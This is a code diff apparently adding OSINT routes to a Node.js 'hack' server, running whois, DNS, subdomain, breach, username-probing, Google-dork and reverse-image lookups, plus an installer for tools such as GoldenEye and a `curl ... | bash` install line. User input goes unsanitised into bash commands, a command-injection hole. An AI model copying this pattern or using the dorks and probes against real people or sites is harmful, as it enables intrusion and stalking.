+        case 'phoneinfoga': cmd = `phoneinfoga scan -n "${t}" 2>&1 | head -60 || echo "Install: https://github.com/sundowndev/phoneinfoga/releases"`; break;
+        case 'whois': cmd = `whois "${t}" 2>/dev/null`; break;
+        case 'dns-all': cmd = `echo "=== A ===" && dig +short A ${t} 2>/dev/null && echo "=== AAAA ===" && dig +short AAAA ${t} 2>/dev/null && echo "=== MX ===" && dig +short MX ${t} 2>/dev/null && echo "=== NS ===" && dig +short NS ${t} 2>/dev/null && echo "=== TXT ===" && dig +short TXT ${t} 2>/dev/null && echo "=== SOA ===" && dig +short SOA ${t} 2>/dev/null && echo "=== CNAME ===" && dig +short CNAME ${t} 2>/dev/null`; break;
+        case 'subdomain': cmd = `subfinder -d "${t}" -silent 2>/dev/null | head -80 || (echo "Trying crt.sh..." && curl -s "https://crt.sh/?q=%25.${t}&output=json" 2>/dev/null | python3 -c "import sys,json;[print(e['name_value']) for e in json.load(sys.stdin)]" 2>/dev/null | sort -u | head -80)`; break;
+        case 'ip-lookup': cmd = `curl -s "http://ip-api.com/json/${t}" 2>/dev/null | python3 -m json.tool 2>/dev/null`; break;
+        case 'email-breach': {
+                const hibpKey = getIntelConfig().hibpApiKey || '';
+                if (hibpKey) {
+                    cmd = `curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/${t}" -H "hibp-api-key: ${hibpKey}" -H "user-agent: ShadowCypher" 2>/dev/null`;
+                } else {
+                    cmd = `echo "No HIBP API key configured. Set it in Intelligence > Config."; echo "Free manual check: https://haveibeenpwned.com/account/${t}"`;
+                }
+                break;
+            }
+        case 'google-dork': cmd = `echo "Google Dorks for ${t}:" && echo "  site:${t} filetype:pdf" && echo "  site:${t} filetype:sql" && echo "  site:${t} filetype:env" && echo "  site:${t} filetype:log" && echo "  site:${t} inurl:admin" && echo "  site:${t} inurl:login" && echo "  site:${t} intitle:index.of" && echo "  site:${t} ext:php intitle:phpinfo" && echo "  site:${t} inurl:wp-content" && echo "  \"${t}\" password|secret|key|token" && echo "  \"${t}\" site:pastebin.com" && echo "  \"${t}\" site:github.com password|secret"` ; break;
+        case 'social-media': {
+                const platforms = [
+                    ['https://api.github.com/users/' + t, 'GitHub'],
+                    ['https://www.reddit.com/user/' + t + '/about.json', 'Reddit'],
+                    ['https://www.instagram.com/' + t + '/', 'Instagram'],
+                    ['https://x.com/' + t, 'Twitter/X'],
+                    ['https://www.tiktok.com/@' + t, 'TikTok'],
+                    ['https://www.pinterest.com/' + t + '/', 'Pinterest'],
+                    ['https://medium.com/@' + t, 'Medium'],
+                    ['https://www.twitch.tv/' + t, 'Twitch'],
+                    ['https://steamcommunity.com/id/' + t, 'Steam'],
+                    ['https://open.spotify.com/user/' + t, 'Spotify'],
+                    ['https://www.youtube.com/@' + t, 'YouTube'],
+                    ['https://gitlab.com/' + t, 'GitLab'],
+                ];
+                let output = '=== Social Media OSINT: ' + t + ' ===\n\n';
+                const checks = await Promise.allSettled(platforms.map(async ([url, name]) => {
+                    try {
+                        const code = await run('curl -s -o /dev/null -w "%{http_code}" -L --max-time 5 "' + url + '" 2>/dev/null', 8000);
+                        return { name, url, code: code.trim() };
+                    } catch(e) { return { name, url, code: 'err' }; }
+                }));
+                for (const r of checks) {
+                    if (r.status !== 'fulfilled') continue;
+                    const { name, url, code } = r.value;
+                    if (code === '200') output += '[FOUND] ' + name + ' (' + code + ') -> ' + url + '\n';
+                    else if (code === '404') output += '[  -  ] ' + name + ' (' + code + ')\n';
+                    else output += '[ ??? ] ' + name + ' (' + code + ')\n';
+                }
+                return res.json({ output });
+            }
+        case 'reverse-image': cmd = `echo "Reverse Image Search for: ${t}" && echo "" && echo "Google Lens: https://lens.google.com/uploadbyurl?url=${t}" && echo "Yandex Images: https://yandex.com/images/search?rpt=imageview&url=${t}" && echo "TinEye: https://tineye.com/search?url=${t}" && echo "" && echo "--- Metadata extraction ---" && curl -sI "${t}" 2>/dev/null | grep -iE "content-type|content-length|last-modified|etag" && exiftool <(curl -s "${t}" 2>/dev/null) 2>/dev/null | head -20 || echo "Could not fetch image metadata"`; break;
+        default: cmd = `echo "Methods: sherlock, maigret, holehe, theharvester, phoneinfoga, whois, dns-all, subdomain, ip-lookup, email-breach, google-dork, social-media, reverse-image"`;
+    }
+    try {
+        const out = await run('timeout 60 bash -c \'' + cmd.replace(/'/g, "'\''") + '\' 2>&1');
+        res.json({ output: out.trim() });
+    } catch (e) { res.json({ output: e.message }); }
+});
+
+// Install OSINT tools
+app.post('/api/hack/install-osint', requireAuth, async (req, res) => {
+    const { tool } = req.body;
+    const map = {
+        'sherlock': 'pip3 install sherlock-project',
+        'maigret': 'pip3 install maigret',
+        'holehe': 'pip3 install holehe',
+        'theharvester': 'pip3 install theHarvester',
+        'dalfox': 'go install github.com/hahwul/dalfox/v2@latest',
+        'nosqlmap': 'pip3 install nosqlmap',
+        'goldeneye': 'sudo git clone https://github.com/jseidl/GoldenEye /opt/GoldenEye 2>/dev/null && echo "Installed to /opt/GoldenEye"',
+        'phoneinfoga': 'curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash',
+        'all-osint': 'pip3 install sherlock-project maigret holehe theHarvester 2>&1 | tail -10',
+    };
+    if (!tool || !map[tool]) return res.json({ error: 'Unknown: ' + tool });
+    try {
+        const out = await run(map[tool] + ' 2>&1 | tail -15');
+        res.json({ output: out.trim(), success: true });
+    } catch (e) { res.json({ error: e.message }); }
+});
+
+
+// Load Intelligence Operations Center module
+require('./intel-ops')(app, requireAuth, run, fs, path, wss);
 
 // Start server
 server.listen(PORT, () => {
